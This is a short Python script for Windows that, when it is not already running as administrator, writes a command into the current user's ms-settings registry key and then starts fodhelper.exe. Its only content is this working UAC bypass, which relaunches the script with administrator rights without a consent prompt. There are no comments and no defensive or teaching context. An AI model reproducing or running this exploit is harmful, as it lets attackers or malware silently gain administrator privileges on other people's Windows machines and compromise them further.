import ctypes
import os
import sys
import winreg



def _is_admin():
	try:
		return ctypes.windll.shell32.IsUserAnAdmin()
	except:
		return False
def _admin(cmd):
	try:
		winreg.CreateKey(winreg.HKEY_CURRENT_USER,r"Software\Classes\ms-settings\shell\open\command")
		rk=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Classes\ms-settings\shell\open\command",0,winreg.KEY_WRITE)
		winreg.SetValueEx(rk,"DelegateExecute",0,winreg.REG_SZ,"")
		winreg.CloseKey(rk)
		rk=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Classes\ms-settings\shell\open\command",0,winreg.KEY_WRITE)
		winreg.SetValueEx(rk,None,0,winreg.REG_SZ,cmd)
		winreg.CloseKey(rk)
	except WindowsError:
		raise



if (not _is_admin()):
	print("Not Admin!")
	d=os.path.dirname(os.path.realpath(__file__))+"\\"+__file__
	_admin(fr"C:\Windows\System32\cmd.exe /k python {d}")
	os.system(r"C:\Windows\System32\fodhelper.exe")
else:
	print("Admin!")